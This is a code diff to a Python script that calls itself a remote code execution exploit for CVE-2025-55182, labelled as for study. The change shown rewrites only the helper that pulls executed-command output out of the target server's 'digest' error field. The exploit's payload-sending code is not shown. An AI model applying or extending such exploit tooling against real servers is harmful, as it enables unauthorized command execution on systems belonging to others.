@@ -1,6 +1,7 @@
 # Remote Code Execution script to exploit CVE-2025-55182
 # reference: https://github.com/msanft/CVE-2025-55182
 # This is just for study purpose.
+import re
 import sys
 import json
 import requests
@@ -41,11 +42,24 @@ def parse_output(response_text):
     """Extract the command output from the server's error line.
 
     The command runs with `2>&1 || true`, so stdout+stderr always come back in
-    the "digest" field regardless of the command's exit code.
+    the "digest" field regardless of the command's exit code. The value can span
+    multiple lines when the command output itself contains newlines, so parse the
+    whole response rather than working line by line.
     """
-    for line in response_text.splitlines():
-        if '"digest"' in line:
-            return json.loads(line[line.index("{"):]).get("digest", "")
+    m = re.search(r'\{[^{}]*"digest"\s*:.*\}', response_text, re.DOTALL)
+    if not m:
+        return ""
+    # The greedy match may swallow trailing Flight rows; trim back to a
+    # parseable object.
+    blob = m.group(0)
+    while blob:
+        try:
+            return json.loads(blob).get("digest", "")
+        except json.JSONDecodeError:
+            cut = blob.rfind("}")
+            if cut <= 0:
+                break
+            blob = blob[:cut]
     return ""
 
 
